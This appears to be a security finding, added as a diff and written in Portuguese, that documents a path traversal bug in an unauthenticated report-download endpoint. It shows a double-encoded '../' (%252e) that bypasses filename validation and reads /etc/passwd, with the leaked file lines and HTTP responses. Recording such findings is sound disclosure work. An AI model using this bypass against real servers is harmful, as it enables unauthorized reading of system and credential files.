@@ -1,0 +1,16 @@
+# Path Traversal / LFI — download_report (SEM autenticacao)
+# Causa: validate_filename roda ANTES do unquote; double-encoding burla a allow-list.
+----------------------------------------------------------------
+# 1) filename=teste               -> HTTP 404  {"message":"File not found at '/app/reports/teste'."}  (vaza /app/reports)
+# 2) ../ single-encoded           -> HTTP 400  {"message":"Invalid input."}  (gateway decodifica, validacao barra)
+# 3) ../ DOUBLE-encoded -> le /etc/passwd:
+#    root:x:0:0:root:/root:/bin/sh
+#    bin:x:1:1:bin:/bin:/sbin/nologin
+#    daemon:x:2:2:daemon:/sbin:/sbin/nologin
+#    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+#    sync:x:5:0:sync:/sbin:/bin/sync
+#    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+#    [HTTP 200]
+----------------------------------------------------------------
+# Prova: com double-encoding (%252e -> %2e no gateway -> '.' no unquote), a
+# validacao e burlada e o endpoint le arquivos arbitrarios do servidor, sem token.
